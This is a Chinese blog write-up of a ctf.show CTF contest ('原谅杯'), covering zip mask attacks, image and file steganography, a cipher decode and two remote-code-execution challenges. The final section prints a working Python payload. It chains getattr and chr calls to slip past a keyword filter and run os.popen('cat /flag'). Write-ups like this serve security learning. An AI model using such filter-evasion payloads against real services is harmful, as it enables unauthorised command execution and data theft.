title: ctf-show_原谅杯wp
categories: [CTF]
tags: [wp,web,mics]

---

趁着双十一嘛,在集训的时候摸鱼去原谅杯看了看
<!--more-->

## 原谅1

进入题目看到的就是一张抽象图片.

![image-20201112124008591]( image-20201112124008591.png)

推测应该暗示压缩包密码,前几位推测是`1317`后面不知道于是采用掩码攻击.

得到密码后提取压缩包得到一个1.jpg.用stegsolve找到flag.

![image-20201112124424057]( image-20201112124424057.png)

## 原谅2

考的是文件隐写与火星文加密.

用binwalk 提前压缩包,发现出了个hint.txt

![image-20201112122935678]( image-20201112122935678.png)

打开发现疑似有火星文加密.

解密:`佛曰wohsftc学废了适就是压缩包的key`(之前刚做的时,把wohsftc倒置了,结果发现不用倒置)

用解出的密码,解压压缩包就得到了flag



## 原谅3

一个php的rce但是过滤了很多读取文件的命令,最后发现可以用php来读取出来.(php tql!)

![image-20201112124830058]( image-20201112124830058.png)

## 原谅5_fastapi2

进入发现是个python的远程rce,但过滤了不少.而且返回值类型还有了限制.

偶然间发现dir函数还没被过滤.执行查看.

![image-20201112115723078]( image-20201112115723078.png)

发现有一个奇怪的变量`kiword`,查看一下发现了'chr'字符串

![image-20201112115753581]( image-20201112115753581.png)

由于有dir()函数在,推测环境中`__builtins__`及其类中含有的方法也在环境中.

所以尝试用getattr方法绕waf获得flag.

经过尝试通过`getattr(__builtins__,kiword)`获得了chr函数

再通过chr函数拼接出更多的字符串.再利用getattr方法套娃来构造:

`__import__("os").popen().read`

从而获得对面的shell来读取flag.

payload:

```
q=getattr(getattr(__builtins__,getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95))(getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)),getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110))(getattr(__builtins__,kiword)(99)+getattr(__builtins__,kiword)(97)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(32)+getattr(__builtins__,kiword)(47)+getattr(__builtins__,kiword)(102)+getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(97)+getattr(__builtins__,kiword)(103)).read()
```



